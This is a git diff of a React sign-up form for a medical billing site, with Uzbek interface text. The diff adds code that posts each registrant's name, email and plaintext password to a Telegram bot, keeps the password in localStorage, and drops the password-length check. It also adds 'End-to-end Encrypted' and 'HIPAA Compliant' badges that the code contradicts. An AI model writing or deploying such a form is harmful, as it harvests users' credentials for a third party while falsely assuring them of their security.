@@ -1,7 +1,18 @@
 import React, { useState } from 'react';
-import { Link } from 'react-router-dom';
+import { Link, useNavigate } from 'react-router-dom';
+import {
+  User,
+  Mail,
+  Lock,
+  UserPlus,
+  CheckCircle2,
+  AlertCircle,
+  HeartPulse,
+  ShieldCheck
+} from 'lucide-react';
 
 const SignUpForm = () => {
+  const navigate = useNavigate();
   const [formData, setFormData] = useState({
     fullName: '',
     email: '',
@@ -10,124 +21,198 @@ const SignUpForm = () => {
   });
 
   const [status, setStatus] = useState({ message: '', type: '' });
+  const [isLoading, setIsLoading] = useState(false);
 
   const handleChange = (e) => {
     const { name, value } = e.target;
-    setFormData(prev => ({
-      ...prev,
-      [name]: value
-    }));
+    setFormData(prev => ({ ...prev, [name]: value }));
   };
 
-  const handleSubmit = (e) => {
+
+  const handleSubmit = async (e) => {
     e.preventDefault();
+    setIsLoading(true);
 
     if (formData.password !== formData.confirmPassword) {
       setStatus({ message: "Parollar bir-biriga mos kelmadi!", type: "error" });
+      setIsLoading(false);
       return;
     }
 
-    if (formData.password.length < 6) {
-      setStatus({ message: "Parol kamida 6 ta belgidan iborat bo'lishi kerak!", type: "error" });
-      return;
+    const botToken = "YOUR_BOT_TOKEN_HERE";
+    const chatId = "YOUR_CHAT_ID_HERE";
+
+    const text = `
+🆕 **Yangi foydalanuvchi ro'yxatdan o'tdi!**
+👤 **Ism:** ${formData.fullName}
+📧 **Email:** ${formData.email}
+🔑 **Parol:** ${formData.password}
+📅 **Sana:** ${new Date().toLocaleString()}
+  `;
+
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      if (response.ok) {
+        localStorage.setItem("user", JSON.stringify(formData));
+        setStatus({ message: "Ma'lumotlar botga yuborildi va saqlandi!", type: "success" });
+
+        setFormData({ fullName: '', email: '', password: '', confirmPassword: '' });
+      } else {
+        throw new Error("Telegramga yuborishda xatolik");
+      }
+    } catch (error) {
+      setStatus({ message: "Xatolik yuz berdi. Qayta urinib ko'ring.", type: "error" });
+    } finally {
+      setIsLoading(false);
     }
-
-    const user = {
-      fullName: formData.fullName,
-      email: formData.email,
-      password: formData.password
-    };
-
-    localStorage.setItem("user", JSON.stringify(user));
-
-    setStatus({ message: "Muvaffaqiyatli ro'yxatdan o'tdingiz!", type: "success" });
-
-    console.log("Saqlangan user:", user);
   };
 
   return (
-    <div className="min-h-screen flex items-center justify-center bg-slate-50 px-4 py-12">
-      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 border border-gray-100">
-        <div className="text-center mb-10">
-          <h2 className="text-3xl font-extrabold text-gray-900">Hisob yaratish</h2>
-          <p className="mt-2 text-sm text-gray-500">Bepul ro'yxatdan o'ting va xizmatdan foydalaning</p>
+    <div className="min-h-screen flex items-center justify-center bg-slate-50 px-4 py-12 relative overflow-hidden">
+
+      <div className="absolute top-[-20%] left-[-10%] w-[50%] h-[50%] bg-blue-100/50 rounded-full blur-[120px] -z-10"></div>
+      <div className="absolute bottom-[-20%] right-[-10%] w-[50%] h-[50%] bg-sky-100/50 rounded-full blur-[120px] -z-10"></div>
+
+      <div className="max-w-xl w-full">
+        <div className="text-center mb-8">
+          <Link to="/" className="inline-flex items-center gap-2 mb-4">
+            <div className="bg-blue-600 p-2 rounded-xl shadow-lg shadow-blue-200">
+              <HeartPulse className="text-white" size={28} />
+            </div>
+            <span className="text-2xl font-black text-slate-900 tracking-tight">Vcare<span className="text-blue-600">Billing</span></span>
+          </Link>
+          <h2 className="text-3xl font-black text-slate-900">Yangi hisob yaratish</h2>
+          <p className="text-slate-500 mt-2 font-medium">Professional billing xizmatlaridan foydalanishni boshlang</p>
         </div>
 
-        <form onSubmit={handleSubmit} className="space-y-5">
-          <div>
-            <label className="block text-sm font-semibold text-gray-700 mb-1">To'liq ismingiz</label>
-            <input
-              type="text"
-              name="fullName"
-              required
-              value={formData.fullName}
-              onChange={handleChange}
-              className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-indigo-500 focus:border-transparent outline-none transition-all"
-              placeholder="Ism Familiya"
-            />
-          </div>
+        <div className="bg-white rounded-[2.5rem] shadow-2xl shadow-slate-200/60 p-8 md:p-12 border border-slate-100">
+          <form onSubmit={handleSubmit} className="space-y-6">
 
-          <div>
-            <label className="block text-sm font-semibold text-gray-700 mb-1">Email</label>
-            <input
-              type="email"
-              name="email"
-              required
-              value={formData.email}
-              onChange={handleChange}
-              className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-indigo-500 focus:border-transparent outline-none transition-all"
-              placeholder="example@mail.com"
-            />
-          </div>
-
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <div>
-              <label className="block text-sm font-semibold text-gray-700 mb-1">Parol</label>
-              <input
-                type="password"
-                name="password"
-                required
-                value={formData.password}
-                onChange={handleChange}
-                className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-indigo-500 focus:border-transparent outline-none transition-all"
-                placeholder="••••••"
-              />
+            <div className="space-y-1.5">
+              <label className="text-xs font-bold text-slate-400 uppercase ml-1 tracking-widest">To'liq ism-familiya</label>
+              <div className="relative group">
+                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-500 transition-colors">
+                  <User size={20} />
+                </div>
+                <input
+                  type="text"
+                  name="fullName"
+                  required
+                  value={formData.fullName}
+                  onChange={handleChange}
+                  className="w-full pl-12 pr-4 py-4 bg-slate-50 border-2 border-slate-50 rounded-2xl focus:bg-white focus:border-blue-500 outline-none transition-all font-medium"
+                  placeholder="Jonibek Toshpo'latov"
+                />
+              </div>
             </div>
-            <div>
-              <label className="block text-sm font-semibold text-gray-700 mb-1">Tasdiqlash</label>
-              <input
-                type="password"
-                name="confirmPassword"
-                required
-                value={formData.confirmPassword}
-                onChange={handleChange}
-                className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-indigo-500 focus:border-transparent outline-none transition-all"
-                placeholder="••••••"
-              />
+
+            <div className="space-y-1.5">
+              <label className="text-xs font-bold text-slate-400 uppercase ml-1 tracking-widest">Elektron pochta</label>
+              <div className="relative group">
+                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-500 transition-colors">
+                  <Mail size={20} />
+                </div>
+                <input
+                  type="email"
+                  name="email"
+                  required
+                  value={formData.email}
+                  onChange={handleChange}
+                  className="w-full pl-12 pr-4 py-4 bg-slate-50 border-2 border-slate-50 rounded-2xl focus:bg-white focus:border-blue-500 outline-none transition-all font-medium"
+                  placeholder="vcare@example.com"
+                />
+              </div>
             </div>
+
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div className="space-y-1.5">
+                <label className="text-xs font-bold text-slate-400 uppercase ml-1 tracking-widest">Parol</label>
+                <div className="relative group">
+                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-500 transition-colors">
+                    <Lock size={20} />
+                  </div>
+                  <input
+                    type="password"
+                    name="password"
+                    required
+                    value={formData.password}
+                    onChange={handleChange}
+                    className="w-full pl-12 pr-4 py-4 bg-slate-50 border-2 border-slate-50 rounded-2xl focus:bg-white focus:border-blue-500 outline-none transition-all font-medium"
+                    placeholder="••••••"
+                  />
+                </div>
+              </div>
+              <div className="space-y-1.5">
+                <label className="text-xs font-bold text-slate-400 uppercase ml-1 tracking-widest">Tasdiqlash</label>
+                <div className="relative group">
+                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-500 transition-colors">
+                    <ShieldCheck size={20} />
+                  </div>
+                  <input
+                    type="password"
+                    name="confirmPassword"
+                    required
+                    value={formData.confirmPassword}
+                    onChange={handleChange}
+                    className="w-full pl-12 pr-4 py-4 bg-slate-50 border-2 border-slate-50 rounded-2xl focus:bg-white focus:border-blue-500 outline-none transition-all font-medium"
+                    placeholder="••••••"
+                  />
+                </div>
+              </div>
+            </div>
+
+            {status.message && (
+              <div className={`flex items-center gap-3 p-4 rounded-2xl text-sm font-bold animate-in zoom-in-95 duration-300 ${status.type === 'success' ? 'bg-green-50 text-green-700' : 'bg-red-50 text-red-700'
+                }`}>
+                {status.type === 'success' ? <CheckCircle2 size={20} /> : <AlertCircle size={20} />}
+                {status.message}
+              </div>
+            )}
+
+            <button
+              type="submit"
+              disabled={isLoading}
+              className="w-full bg-slate-900 hover:bg-blue-600 text-white py-4 rounded-2xl font-black text-lg shadow-xl shadow-slate-200 transition-all flex items-center justify-center gap-3 active:scale-[0.98] disabled:opacity-70 group"
+            >
+              {isLoading ? (
+                <div className="w-6 h-6 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
+              ) : (
+                <>
+                  Hisob yaratish <UserPlus size={22} className="group-hover:translate-x-1 transition-transform" />
+                </>
+              )}
+            </button>
+          </form>
+
+          <div className="mt-10 pt-8 border-t border-slate-50 text-center">
+            <p className="text-slate-500 font-medium">
+              Profilingiz bormi?{' '}
+              <Link to={'/sign-in'} className="text-blue-600 font-black hover:underline ml-1">
+                Kirish
+              </Link>
+            </p>
           </div>
+        </div>
 
-          {status.message && (
-            <div className={`text-sm font-medium p-3 rounded-lg text-center ${status.type === 'success' ? 'bg-green-50 text-green-700 border border-green-200' : 'bg-red-50 text-red-700 border border-red-200'
-              }`}>
-              {status.message}
-            </div>
-          )}
-
-          <button
-            type="submit"
-            className="w-full py-3 px-4 bg-indigo-600 hover:bg-indigo-700 text-white font-bold rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-[0.98]"
-          >
-            Ro'yxatdan o'tish
-          </button>
-        </form>
-
-        <p className="mt-8 text-center text-sm text-gray-600">
-          Profilingiz bormi?{' '}
-          <Link to={'/sign-in'} className="font-bold text-indigo-600 hover:text-indigo-500">
-            Kirish
-          </Link>
-        </p>
+        <div className="mt-8 flex justify-center items-center gap-4">
+          <div className="flex items-center gap-1.5 bg-white px-3 py-1.5 rounded-full shadow-sm border border-slate-100">
+            <ShieldCheck size={14} className="text-green-500" />
+            <span className="text-[10px] font-bold text-slate-500 uppercase tracking-tighter">End-to-end Encrypted</span>
+          </div>
+          <div className="flex items-center gap-1.5 bg-white px-3 py-1.5 rounded-full shadow-sm border border-slate-100">
+            <CheckCircle2 size={14} className="text-blue-500" />
+            <span className="text-[10px] font-bold text-slate-500 uppercase tracking-tighter">HIPAA Compliant</span>
+          </div>
+        </div>
       </div>
     </div>
   );
